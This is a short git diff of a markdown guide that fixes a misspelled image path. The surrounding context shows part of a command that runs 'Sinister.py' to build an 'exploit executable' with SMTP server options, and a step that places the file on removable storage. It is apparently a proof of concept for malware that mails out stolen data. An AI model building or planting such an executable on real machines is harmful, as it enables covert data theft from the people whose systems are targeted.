@@ -54,7 +54,7 @@ python Sinister.py -w -s -x smtp.server.com -y smtp_port_number -b C:\Windows\Sy
 -t 86400
 ```
 
-![Creating Exploit Executable](/images/POC_2/Preperation/POC2_Sinister_Create_Executable.png)
+![Creating Exploit Executable](/images/POC_2/Preparation/POC2_Sinister_Create_Executable.png)
 
 4. Locate the file and store it within a removable storage device
 
